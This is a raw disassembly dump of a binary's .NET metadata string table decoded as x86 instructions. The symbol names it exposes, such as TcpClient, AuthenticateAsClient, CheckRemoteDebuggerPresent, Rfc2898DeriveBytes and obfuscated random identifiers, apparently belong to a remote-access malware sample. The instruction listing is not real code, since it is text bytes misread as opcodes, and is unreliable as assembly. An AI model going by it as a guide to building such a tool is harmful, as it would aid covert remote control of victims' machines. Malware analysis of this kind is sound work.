  40939b:	73 74                	jae    0x409411
  40939d:	41                   	inc    %ecx
  40939e:	64 64 72 65          	fs fs jb 0x409407
  4093a2:	73 73                	jae    0x409417
  4093a4:	65 73 00             	gs jae 0x4093a7
  4093a7:	53                   	push   %ebx
  4093a8:	79 73                	jns    0x40941d
  4093aa:	74 65                	je     0x409411
  4093ac:	6d                   	insl   (%dx),%es:(%edi)
  4093ad:	2e 53                	cs push %ebx
  4093af:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4093b3:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  4093ba:	70 
  4093bb:	74 6f                	je     0x40942c
  4093bd:	67 72 61             	addr16 jb 0x409421
  4093c0:	70 68                	jo     0x40942a
  4093c2:	79 2e                	jns    0x4093f2
  4093c4:	58                   	pop    %eax
  4093c5:	35 30 39 43 65       	xor    $0x65433930,%eax
  4093ca:	72 74                	jb     0x409440
  4093cc:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4093d3:	73 00                	jae    0x4093d5
  4093d5:	52                   	push   %edx
  4093d6:	66 63 32             	arpl   %si,(%edx)
  4093d9:	38 39                	cmp    %bh,(%ecx)
  4093db:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  4093df:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  4093e6:	73 00                	jae    0x4093e8
  4093e8:	52                   	push   %edx
  4093e9:	65 61                	gs popa
  4093eb:	64 41                	fs inc %ecx
  4093ed:	6c                   	insb   (%dx),%es:(%edi)
  4093ee:	6c                   	insb   (%dx),%es:(%edi)
  4093ef:	42                   	inc    %edx
  4093f0:	79 74                	jns    0x409466
  4093f2:	65 73 00             	gs jae 0x4093f5
  4093f5:	47                   	inc    %edi
  4093f6:	65 74 42             	gs je  0x40943b
  4093f9:	79 74                	jns    0x40946f
  4093fb:	65 73 00             	gs jae 0x4093fe
  4093fe:	4e                   	dec    %esi
  4093ff:	65 78 74             	gs js  0x409476
  409402:	42                   	inc    %edx
  409403:	79 74                	jns    0x409479
  409405:	65 73 00             	gs jae 0x409408
  409408:	43                   	inc    %ebx
  409409:	53                   	push   %ebx
  40940a:	68 61 72 70 41       	push   $0x41707261
  40940f:	72 67                	jb     0x409478
  409411:	75 6d                	jne    0x409480
  409413:	65 6e                	outsb  %gs:(%esi),(%dx)
  409415:	74 49                	je     0x409460
  409417:	6e                   	outsb  %ds:(%esi),(%dx)
  409418:	66 6f                	outsw  %ds:(%esi),(%dx)
  40941a:	46                   	inc    %esi
  40941b:	6c                   	insb   (%dx),%es:(%edi)
  40941c:	61                   	popa
  40941d:	67 73 00             	addr16 jae 0x409420
  409420:	43                   	inc    %ebx
  409421:	53                   	push   %ebx
  409422:	68 61 72 70 42       	push   $0x42707261
  409427:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  40942e:	61                   	popa
  40942f:	67 73 00             	addr16 jae 0x409432
  409432:	53                   	push   %ebx
  409433:	74 72                	je     0x4094a7
  409435:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  40943c:	73 73                	jae    0x4094b1
  40943e:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  409445:	6e                   	outsb  %ds:(%esi),(%dx)
  409446:	67 45                	addr16 inc %ebp
  409448:	76 65                	jbe    0x4094af
  40944a:	6e                   	outsb  %ds:(%esi),(%dx)
  40944b:	74 41                	je     0x40948e
  40944d:	72 67                	jb     0x4094b6
  40944f:	73 00                	jae    0x409451
  409451:	53                   	push   %ebx
  409452:	74 70                	je     0x4094c4
  409454:	57                   	push   %edi
  409455:	4f                   	dec    %edi
  409456:	6c                   	insb   (%dx),%es:(%edi)
  409457:	6c                   	insb   (%dx),%es:(%edi)
  409458:	50                   	push   %eax
  409459:	51                   	push   %ecx
  40945a:	7a 4d                	jp     0x4094a9
  40945c:	4a                   	dec    %edx
  40945d:	43                   	inc    %ebx
  40945e:	68 73 00 49 43       	push   $0x43490073
  409463:	72 65                	jb     0x4094ca
  409465:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409468:	74 69                	je     0x4094d3
  40946a:	61                   	popa
  40946b:	6c                   	insb   (%dx),%es:(%edi)
  40946c:	73 00                	jae    0x40946e
  40946e:	73 65                	jae    0x4094d5
  409470:	74 5f                	je     0x4094d1
  409472:	43                   	inc    %ebx
  409473:	72 65                	jb     0x4094da
  409475:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409478:	74 69                	je     0x4094e3
  40947a:	61                   	popa
  40947b:	6c                   	insb   (%dx),%es:(%edi)
  40947c:	73 00                	jae    0x40947e
  40947e:	45                   	inc    %ebp
  40947f:	71 75                	jno    0x4094f6
  409481:	61                   	popa
  409482:	6c                   	insb   (%dx),%es:(%edi)
  409483:	73 00                	jae    0x409485
  409485:	53                   	push   %ebx
  409486:	73 6c                	jae    0x4094f4
  409488:	50                   	push   %eax
  409489:	72 6f                	jb     0x4094fa
  40948b:	74 6f                	je     0x4094fc
  40948d:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  409490:	73 00                	jae    0x409492
  409492:	53                   	push   %ebx
  409493:	79 73                	jns    0x409508
  409495:	74 65                	je     0x4094fc
  409497:	6d                   	insl   (%dx),%es:(%edi)
  409498:	2e 57                	cs push %edi
  40949a:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  4094a1:	46                   	inc    %esi
  4094a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4094a3:	72 6d                	jb     0x409512
  4094a5:	73 00                	jae    0x4094a7
  4094a7:	44                   	inc    %esp
  4094a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4094a9:	73 00                	jae    0x4094ab
  4094ab:	43                   	inc    %ebx
  4094ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4094ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4094ae:	74 61                	je     0x409511
  4094b0:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  4094b7:	74 65                	je     0x40951e
  4094b9:	6d                   	insl   (%dx),%es:(%edi)
  4094ba:	2e 43                	cs inc %ebx
  4094bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4094bd:	6c                   	insb   (%dx),%es:(%edi)
  4094be:	6c                   	insb   (%dx),%es:(%edi)
  4094bf:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4094c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4094c5:	73 00                	jae    0x4094c7
  4094c7:	53                   	push   %ebx
  4094c8:	74 72                	je     0x40953c
  4094ca:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  4094d1:	74 4f                	je     0x409522
  4094d3:	70 74                	jo     0x409549
  4094d5:	69 6f 6e 73 00 7a 43 	imul   $0x437a0073,0x6e(%edi),%ebp
  4094dc:	70 6b                	jo     0x409549
  4094de:	52                   	push   %edx
  4094df:	43                   	inc    %ebx
  4094e0:	79 4f                	jns    0x409531
  4094e2:	69 67 58 76 42 6f 73 	imul   $0x736f4276,0x58(%edi),%esp
  4094e9:	00 4a 6f             	add    %cl,0x6f(%edx)
  4094ec:	6d                   	insl   (%dx),%es:(%edi)
  4094ed:	70 46                	jo     0x409535
  4094ef:	63 52 75             	arpl   %edx,0x75(%edx)
  4094f2:	4d                   	dec    %ebp
  4094f3:	42                   	inc    %edx
  4094f4:	66 62 72 73          	bound  %si,0x73(%edx)
  4094f8:	00 47 65             	add    %al,0x65(%edi)
  4094fb:	74 49                	je     0x409546
  4094fd:	6d                   	insl   (%dx),%es:(%edi)
  4094fe:	61                   	popa
  4094ff:	67 65 44             	addr16 gs inc %esp
  409502:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  409506:	65 72 73             	gs jb  0x40957c
  409509:	00 52 75             	add    %dl,0x75(%edx)
  40950c:	6e                   	outsb  %ds:(%esi),(%dx)
  40950d:	74 69                	je     0x409578
  40950f:	6d                   	insl   (%dx),%es:(%edi)
  409510:	65 48                	gs dec %eax
  409512:	65 6c                	gs insb (%dx),%es:(%edi)
  409514:	70 65                	jo     0x40957b
  409516:	72 73                	jb     0x40958b
  409518:	00 53 73             	add    %dl,0x73(%ebx)
  40951b:	6c                   	insb   (%dx),%es:(%edi)
  40951c:	50                   	push   %eax
  40951d:	6f                   	outsl  %ds:(%esi),(%dx)
  40951e:	6c                   	insb   (%dx),%es:(%edi)
  40951f:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  409526:	72 73                	jb     0x40959b
  409528:	00 46 69             	add    %al,0x69(%esi)
  40952b:	6c                   	insb   (%dx),%es:(%edi)
  40952c:	65 41                	gs inc %ecx
  40952e:	63 63 65             	arpl   %esp,0x65(%ebx)
  409531:	73 73                	jae    0x4095a6
  409533:	00 47 65             	add    %al,0x65(%edi)
  409536:	74 43                	je     0x40957b
  409538:	75 72                	jne    0x4095ac
  40953a:	72 65                	jb     0x4095a1
  40953c:	6e                   	outsb  %ds:(%esi),(%dx)
  40953d:	74 50                	je     0x40958f
  40953f:	72 6f                	jb     0x4095b0
  409541:	63 65 73             	arpl   %esp,0x73(%ebp)
  409544:	73 00                	jae    0x409546
  409546:	49                   	dec    %ecx
  409547:	50                   	push   %eax
  409548:	41                   	inc    %ecx
  409549:	64 64 72 65          	fs fs jb 0x4095b2
  40954d:	73 73                	jae    0x4095c2
  40954f:	00 53 79             	add    %dl,0x79(%ebx)
  409552:	73 74                	jae    0x4095c8
  409554:	65 6d                	gs insl (%dx),%es:(%edi)
  409556:	2e 4e                	cs dec %esi
  409558:	65 74 2e             	gs je  0x409589
  40955b:	53                   	push   %ebx
  40955c:	6f                   	outsl  %ds:(%esi),(%dx)
  40955d:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  409560:	74 73                	je     0x4095d5
  409562:	00 73 65             	add    %dh,0x65(%ebx)
  409565:	74 5f                	je     0x4095c6
  409567:	41                   	inc    %ecx
  409568:	72 67                	jb     0x4095d1
  40956a:	75 6d                	jne    0x4095d9
  40956c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40956e:	74 73                	je     0x4095e3
  409570:	00 53 79             	add    %dl,0x79(%ebx)
  409573:	73 74                	jae    0x4095e9
  409575:	65 6d                	gs insl (%dx),%es:(%edi)
  409577:	45                   	inc    %ebp
  409578:	76 65                	jbe    0x4095df
  40957a:	6e                   	outsb  %ds:(%esi),(%dx)
  40957b:	74 73                	je     0x4095f0
  40957d:	00 45 78             	add    %al,0x78(%ebp)
  409580:	69 73 74 73 00 6e 4b 	imul   $0x4b6e0073,0x74(%ebx),%esi
  409587:	6d                   	insl   (%dx),%es:(%edi)
  409588:	58                   	pop    %eax
  409589:	41                   	inc    %ecx
  40958a:	71 57                	jno    0x4095e3
  40958c:	55                   	push   %ebp
  40958d:	7a 75                	jp     0x409604
  40958f:	73 00                	jae    0x409591
  409591:	51                   	push   %ecx
  409592:	64 62 50 52          	bound  %edx,%fs:0x52(%eax)
  409596:	47                   	inc    %edi
  409597:	6f                   	outsl  %ds:(%esi),(%dx)
  409598:	72 64                	jb     0x4095fe
  40959a:	67 59                	addr16 pop %ecx
  40959c:	50                   	push   %eax
  40959d:	6a 43                	push   $0x43
  40959f:	74 00                	je     0x4095a1
  4095a1:	45                   	inc    %ebp
  4095a2:	5a                   	pop    %edx
  4095a3:	68 7a 52 44 50       	push   $0x5044527a
  4095a8:	4a                   	dec    %edx
  4095a9:	47                   	inc    %edi
  4095aa:	74 00                	je     0x4095ac
  4095ac:	55                   	push   %ebp
  4095ad:	70 77                	jo     0x409626
  4095af:	6b 74 4f 4c 4c       	imul   $0x4c,0x4c(%edi,%ecx,2),%esi
  4095b4:	66 44                	inc    %sp
  4095b6:	6e                   	outsb  %ds:(%esi),(%dx)
  4095b7:	6b 69 4a 74          	imul   $0x74,0x4a(%ecx),%ebp
  4095bb:	00 63 78             	add    %ah,0x78(%ebx)
  4095be:	65 74 41             	gs je  0x409602
  4095c1:	47                   	inc    %edi
  4095c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4095c3:	78 75                	js     0x40963a
  4095c5:	61                   	popa
  4095c6:	73 70                	jae    0x409638
  4095c8:	45                   	inc    %ebp
  4095c9:	42                   	inc    %edx
  4095ca:	50                   	push   %eax
  4095cb:	74 00                	je     0x4095cd
  4095cd:	62 57 79             	bound  %edx,0x79(%edi)
  4095d0:	46                   	inc    %esi
  4095d1:	65 62 47 44          	bound  %eax,%gs:0x44(%edi)
  4095d5:	5a                   	pop    %edx
  4095d6:	55                   	push   %ebp
  4095d7:	74 00                	je     0x4095d9
  4095d9:	63 64 6c 53          	arpl   %esp,0x53(%esp,%ebp,2)
  4095dd:	41                   	inc    %ecx
  4095de:	44                   	inc    %esp
  4095df:	75 79                	jne    0x40965a
  4095e1:	42                   	inc    %edx
  4095e2:	66 78 6e             	data16 js 0x409653
  4095e5:	43                   	inc    %ebx
  4095e6:	58                   	pop    %eax
  4095e7:	74 00                	je     0x4095e9
  4095e9:	43                   	inc    %ebx
  4095ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4095eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4095ec:	63 61 74             	arpl   %esp,0x74(%ecx)
  4095ef:	00 49 6d             	add    %cl,0x6d(%ecx)
  4095f2:	61                   	popa
  4095f3:	67 65 46             	addr16 gs inc %esi
  4095f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4095f7:	72 6d                	jb     0x409666
  4095f9:	61                   	popa
  4095fa:	74 00                	je     0x4095fc
  4095fc:	67 65 74 5f          	addr16 gs je 0x40965f
  409600:	41                   	inc    %ecx
  409601:	73 46                	jae    0x409649
  409603:	6c                   	insb   (%dx),%es:(%edi)
  409604:	6f                   	outsl  %ds:(%esi),(%dx)
  409605:	61                   	popa
  409606:	74 00                	je     0x409608
  409608:	73 65                	jae    0x40966f
  40960a:	74 5f                	je     0x40966b
  40960c:	41                   	inc    %ecx
  40960d:	73 46                	jae    0x409655
  40960f:	6c                   	insb   (%dx),%es:(%edi)
  409610:	6f                   	outsl  %ds:(%esi),(%dx)
  409611:	61                   	popa
  409612:	74 00                	je     0x409614
  409614:	4d                   	dec    %ebp
  409615:	61                   	popa
  409616:	6e                   	outsb  %ds:(%esi),(%dx)
  409617:	61                   	popa
  409618:	67 65 6d             	gs insl (%dx),%es:(%di)
  40961b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40961d:	74 42                	je     0x409661
  40961f:	61                   	popa
  409620:	73 65                	jae    0x409687
  409622:	4f                   	dec    %edi
  409623:	62 6a 65             	bound  %ebp,0x65(%edx)
  409626:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  40962a:	6f                   	outsl  %ds:(%esi),(%dx)
  40962b:	6c                   	insb   (%dx),%es:(%edi)
  40962c:	6c                   	insb   (%dx),%es:(%edi)
  40962d:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  409632:	6f                   	outsl  %ds:(%esi),(%dx)
  409633:	6e                   	outsb  %ds:(%esi),(%dx)
  409634:	6e                   	outsb  %ds:(%esi),(%dx)
  409635:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  40963a:	65 74 00             	gs je  0x40963d
  40963d:	53                   	push   %ebx
  40963e:	79 73                	jns    0x4096b3
  409640:	74 65                	je     0x4096a7
  409642:	6d                   	insl   (%dx),%es:(%edi)
  409643:	2e 4e                	cs dec %esi
  409645:	65 74 00             	gs je  0x409648
  409648:	54                   	push   %esp
  409649:	61                   	popa
  40964a:	72 67                	jb     0x4096b3
  40964c:	65 74 00             	gs je  0x40964f
  40964f:	53                   	push   %ebx
  409650:	6f                   	outsl  %ds:(%esi),(%dx)
  409651:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  409654:	74 00                	je     0x409656
  409656:	53                   	push   %ebx
  409657:	79 73                	jns    0x4096cc
  409659:	74 65                	je     0x4096c0
  40965b:	6d                   	insl   (%dx),%es:(%edi)
  40965c:	2e 43                	cs inc %ebx
  40965e:	6f                   	outsl  %ds:(%esi),(%dx)
  40965f:	6c                   	insb   (%dx),%es:(%edi)
  409660:	6c                   	insb   (%dx),%es:(%edi)
  409661:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409666:	6e                   	outsb  %ds:(%esi),(%dx)
  409667:	73 2e                	jae    0x409697
  409669:	49                   	dec    %ecx
  40966a:	45                   	inc    %ebp
  40966b:	6e                   	outsb  %ds:(%esi),(%dx)
  40966c:	75 6d                	jne    0x4096db
  40966e:	65 72 61             	gs jb  0x4096d2
  409671:	74 6f                	je     0x4096e2
  409673:	72 2e                	jb     0x4096a3
  409675:	52                   	push   %edx
  409676:	65 73 65             	gs jae 0x4096de
  409679:	74 00                	je     0x40967b
  40967b:	67 65 74 5f          	addr16 gs je 0x4096de
  40967f:	4f                   	dec    %edi
  409680:	66 66 73 65          	data16 data16 jae 0x4096e9
  409684:	74 00                	je     0x409686
  409686:	73 65                	jae    0x4096ed
  409688:	74 5f                	je     0x4096e9
  40968a:	4f                   	dec    %edi
  40968b:	66 66 73 65          	data16 data16 jae 0x4096f4
  40968f:	74 00                	je     0x409691
  409691:	53                   	push   %ebx
  409692:	70 6c                	jo     0x409700
  409694:	69 74 00 45 78 69 74 	imul   $0x746978,0x45(%eax,%eax,1),%esi
  40969b:	00 
  40969c:	53                   	push   %ebx
  40969d:	69 6e 67 6c 65 4f 72 	imul   $0x724f656c,0x67(%esi),%ebp
  4096a4:	44                   	inc    %esp
  4096a5:	65 66 61             	gs popaw
  4096a8:	75 6c                	jne    0x409716
  4096aa:	74 00                	je     0x4096ac
  4096ac:	49                   	dec    %ecx
  4096ad:	41                   	inc    %ecx
  4096ae:	73 79                	jae    0x409729
  4096b0:	6e                   	outsb  %ds:(%esi),(%dx)
  4096b1:	63 52 65             	arpl   %edx,0x65(%edx)
  4096b4:	73 75                	jae    0x40972b
  4096b6:	6c                   	insb   (%dx),%es:(%edi)
  4096b7:	74 00                	je     0x4096b9
  4096b9:	54                   	push   %esp
  4096ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4096bb:	55                   	push   %ebp
  4096bc:	70 70                	jo     0x40972e
  4096be:	65 72 49             	gs jb  0x40970a
  4096c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4096c2:	76 61                	jbe    0x409725
  4096c4:	72 69                	jb     0x40972f
  4096c6:	61                   	popa
  4096c7:	6e                   	outsb  %ds:(%esi),(%dx)
  4096c8:	74 00                	je     0x4096ca
  4096ca:	57                   	push   %edi
  4096cb:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  4096cf:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  4096d6:	74 5f                	je     0x409737
  4096d8:	53                   	push   %ebx
  4096d9:	73 6c                	jae    0x409747
  4096db:	43                   	inc    %ebx
  4096dc:	6c                   	insb   (%dx),%es:(%edi)
  4096dd:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  4096e4:	74 5f                	je     0x409745
  4096e6:	53                   	push   %ebx
  4096e7:	73 6c                	jae    0x409755
  4096e9:	43                   	inc    %ebx
  4096ea:	6c                   	insb   (%dx),%es:(%edi)
  4096eb:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  4096f2:	74 5f                	je     0x409753
  4096f4:	54                   	push   %esp
  4096f5:	63 70 43             	arpl   %esi,0x43(%eax)
  4096f8:	6c                   	insb   (%dx),%es:(%edi)
  4096f9:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409700:	74 5f                	je     0x409761
  409702:	54                   	push   %esp
  409703:	63 70 43             	arpl   %esi,0x43(%eax)
  409706:	6c                   	insb   (%dx),%es:(%edi)
  409707:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  40970e:	74 68                	je     0x409778
  409710:	65 6e                	outsb  %gs:(%esi),(%dx)
  409712:	74 69                	je     0x40977d
  409714:	63 61 74             	arpl   %esp,0x74(%ecx)
  409717:	65 41                	gs inc %ecx
  409719:	73 43                	jae    0x40975e
  40971b:	6c                   	insb   (%dx),%es:(%edi)
  40971c:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  409723:	73 74                	jae    0x409799
  409725:	65 6d                	gs insl (%dx),%es:(%edi)
  409727:	2e 4d                	cs dec %ebp
  409729:	61                   	popa
  40972a:	6e                   	outsb  %ds:(%esi),(%dx)
  40972b:	61                   	popa
  40972c:	67 65 6d             	gs insl (%dx),%es:(%di)
  40972f:	65 6e                	outsb  %gs:(%esi),(%dx)
  409731:	74 00                	je     0x409733
  409733:	45                   	inc    %ebp
  409734:	6e                   	outsb  %ds:(%esi),(%dx)
  409735:	76 69                	jbe    0x4097a0
  409737:	72 6f                	jb     0x4097a8
  409739:	6e                   	outsb  %ds:(%esi),(%dx)
  40973a:	6d                   	insl   (%dx),%es:(%edi)
  40973b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40973d:	74 00                	je     0x40973f
  40973f:	53                   	push   %ebx
  409740:	79 73                	jns    0x4097b5
  409742:	74 65                	je     0x4097a9
  409744:	6d                   	insl   (%dx),%es:(%edi)
  409745:	2e 43                	cs inc %ebx
  409747:	6f                   	outsl  %ds:(%esi),(%dx)
  409748:	6c                   	insb   (%dx),%es:(%edi)
  409749:	6c                   	insb   (%dx),%es:(%edi)
  40974a:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40974f:	6e                   	outsb  %ds:(%esi),(%dx)
  409750:	73 2e                	jae    0x409780
  409752:	49                   	dec    %ecx
  409753:	45                   	inc    %ebp
  409754:	6e                   	outsb  %ds:(%esi),(%dx)
  409755:	75 6d                	jne    0x4097c4
  409757:	65 72 61             	gs jb  0x4097bb
  40975a:	74 6f                	je     0x4097cb
  40975c:	72 2e                	jb     0x40978c
  40975e:	67 65 74 5f          	addr16 gs je 0x4097c1
  409762:	43                   	inc    %ebx
  409763:	75 72                	jne    0x4097d7
  409765:	72 65                	jb     0x4097cc
  409767:	6e                   	outsb  %ds:(%esi),(%dx)
  409768:	74 00                	je     0x40976a
  40976a:	47                   	inc    %edi
  40976b:	65 74 43             	gs je  0x4097b1
  40976e:	75 72                	jne    0x4097e2
  409770:	72 65                	jb     0x4097d7
  409772:	6e                   	outsb  %ds:(%esi),(%dx)
  409773:	74 00                	je     0x409775
  409775:	43                   	inc    %ebx
  409776:	68 65 63 6b 52       	push   $0x526b6365
  40977b:	65 6d                	gs insl (%dx),%es:(%edi)
  40977d:	6f                   	outsl  %ds:(%esi),(%dx)
  40977e:	74 65                	je     0x4097e5
  409780:	44                   	inc    %esp
  409781:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  409785:	67 65 72 50          	addr16 gs jb 0x4097d9
  409789:	72 65                	jb     0x4097f0
  40978b:	73 65                	jae    0x4097f2
  40978d:	6e                   	outsb  %ds:(%esi),(%dx)
  40978e:	74 00                	je     0x409790
  409790:	67 65 74 5f          	addr16 gs je 0x4097f3
  409794:	52                   	push   %edx
  409795:	65 6d                	gs insl (%dx),%es:(%edi)
  409797:	6f                   	outsl  %ds:(%esi),(%dx)
  409798:	74 65                	je     0x4097ff
  40979a:	45                   	inc    %ebp
  40979b:	6e                   	outsb  %ds:(%esi),(%dx)
  40979c:	64 50                	fs push %eax
  40979e:	6f                   	outsl  %ds:(%esi),(%dx)
  40979f:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  4097a6:	5f                   	pop    %edi
  4097a7:	43                   	inc    %ebx
  4097a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4097a9:	75 6e                	jne    0x409819
  4097ab:	74 00                	je     0x4097ad
  4097ad:	67 65 74 5f          	addr16 gs je 0x409810
  4097b1:	50                   	push   %eax
  4097b2:	72 6f                	jb     0x409823
  4097b4:	63 65 73             	arpl   %esp,0x73(%ebp)
  4097b7:	73 6f                	jae    0x409828
  4097b9:	72 43                	jb     0x4097fe
  4097bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4097bc:	75 6e                	jne    0x40982c
  4097be:	74 00                	je     0x4097c0
  4097c0:	47                   	inc    %edi
  4097c1:	65 74 50             	gs je  0x409814
  4097c4:	61                   	popa
  4097c5:	74 68                	je     0x40982f
  4097c7:	52                   	push   %edx
  4097c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4097c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4097ca:	74 00                	je     0x4097cc
  4097cc:	6b 67 5a 6b          	imul   $0x6b,0x5a(%edi),%esp
  4097d0:	4f                   	dec    %edi
  4097d1:	4a                   	dec    %edx
  4097d2:	6d                   	insl   (%dx),%es:(%edi)
  4097d3:	71 77                	jno    0x40984c
  4097d5:	70 74                	jo     0x40984b
  4097d7:	00 50 61             	add    %dl,0x61(%eax)
  4097da:	72 61                	jb     0x40983d
  4097dc:	6d                   	insl   (%dx),%es:(%edi)
  4097dd:	65 74 65             	gs je  0x409845
  4097e0:	72 69                	jb     0x40984b
  4097e2:	7a 65                	jp     0x409849
  4097e4:	64 54                	fs push %esp
  4097e6:	68 72 65 61 64       	push   $0x64616572
  4097eb:	53                   	push   %ebx
  4097ec:	74 61                	je     0x40984f
  4097ee:	72 74                	jb     0x409864
  4097f0:	00 43 6f             	add    %al,0x6f(%ebx)
  4097f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4097f4:	76 65                	jbe    0x40985b
  4097f6:	72 74                	jb     0x40986c
  4097f8:	00 59 46             	add    %bl,0x46(%ecx)
  4097fb:	45                   	inc    %ebp
  4097fc:	72 61                	jb     0x40985f
  4097fe:	50                   	push   %eax
  4097ff:	53                   	push   %ebx
  409800:	4c                   	dec    %esp
  409801:	70 72                	jo     0x409875
  409803:	74 00                	je     0x409805
  409805:	43                   	inc    %ebx
  409806:	61                   	popa
  409807:	73 74                	jae    0x40987d
  409809:	00 46 61             	add    %al,0x61(%esi)
  40980c:	69 6c 46 61 73 74 00 	imul   $0x54007473,0x61(%esi,%eax,2),%ebp
  409813:	54 
  409814:	6f                   	outsl  %ds:(%esi),(%dx)
  409815:	4c                   	dec    %esp
  409816:	69 73 74 00 53 79 73 	imul   $0x73795300,0x74(%ebx),%esi
  40981d:	74 65                	je     0x409884
  40981f:	6d                   	insl   (%dx),%es:(%edi)
  409820:	2e 43                	cs inc %ebx
  409822:	6f                   	outsl  %ds:(%esi),(%dx)
  409823:	6c                   	insb   (%dx),%es:(%edi)
  409824:	6c                   	insb   (%dx),%es:(%edi)
  409825:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40982a:	6e                   	outsb  %ds:(%esi),(%dx)
  40982b:	73 2e                	jae    0x40985b
  40982d:	49                   	dec    %ecx
  40982e:	45                   	inc    %ebp
  40982f:	6e                   	outsb  %ds:(%esi),(%dx)
  409830:	75 6d                	jne    0x40989f
  409832:	65 72 61             	gs jb  0x409896
  409835:	74 6f                	je     0x4098a6
  409837:	72 2e                	jb     0x409867
  409839:	4d                   	dec    %ebp
  40983a:	6f                   	outsl  %ds:(%esi),(%dx)
  40983b:	76 65                	jbe    0x4098a2
  40983d:	4e                   	dec    %esi
  40983e:	65 78 74             	gs js  0x4098b5
  409841:	00 53 79             	add    %dl,0x79(%ebx)
  409844:	73 74                	jae    0x4098ba
  409846:	65 6d                	gs insl (%dx),%es:(%edi)
  409848:	2e 54                	cs push %esp
  40984a:	65 78 74             	gs js  0x4098c1
  40984d:	00 4c 6a 6f          	add    %cl,0x6f(%edx,%ebp,2)
  409851:	73 74                	jae    0x4098c7
  409853:	72 4f                	jb     0x4098a4
  409855:	47                   	inc    %edi
  409856:	79 53                	jns    0x4098ab
  409858:	4f                   	dec    %edi
  409859:	41                   	inc    %ecx
  40985a:	75 00                	jne    0x40985c
  40985c:	4e                   	dec    %esi
  40985d:	55                   	push   %ebp
  40985e:	48                   	dec    %eax
  40985f:	46                   	inc    %esi
  409860:	66 65 71 6c          	data16 gs jno 0x4098d0
  409864:	42                   	inc    %edx
  409865:	75 00                	jne    0x409867
  409867:	67 4e                	addr16 dec %esi
  409869:	74 4b                	je     0x4098b6
  40986b:	62 4a 59             	bound  %ecx,0x59(%edx)
  40986e:	71 44                	jno    0x4098b4
  409870:	75 00                	jne    0x409872
  409872:	58                   	pop    %eax
  409873:	59                   	pop    %ecx
  409874:	71 51                	jno    0x4098c7
  409876:	63 50 56             	arpl   %edx,0x56(%eax)
  409879:	55                   	push   %ebp
  40987a:	50                   	push   %eax
  40987b:	45                   	inc    %ebp
  40987c:	70 75                	jo     0x4098f3
  40987e:	54                   	push   %esp
  40987f:	75 00                	jne    0x409881
  409881:	56                   	push   %esi
  409882:	71 6c                	jno    0x4098f0
  409884:	46                   	inc    %esi
  409885:	45                   	inc    %ebp
  409886:	6a 6c                	push   $0x6c
  409888:	4c                   	dec    %esp
  409889:	6b 74 44 56 79       	imul   $0x79,0x56(%esp,%eax,2),%esi
  40988e:	59                   	pop    %ecx
  40988f:	75 00                	jne    0x409891
  409891:	69 68 62 4b 4e 44 70 	imul   $0x70444e4b,0x62(%eax),%ebp
  409898:	4f                   	dec    %edi
  409899:	51                   	push   %ecx
  40989a:	56                   	push   %esi
  40989b:	63 64 75 00          	arpl   %esp,0x0(%ebp,%esi,2)
  40989f:	69 59 61 57 5a 74 6a 	imul   $0x6a745a57,0x61(%ecx),%ebx
  4098a6:	6c                   	insb   (%dx),%es:(%edi)
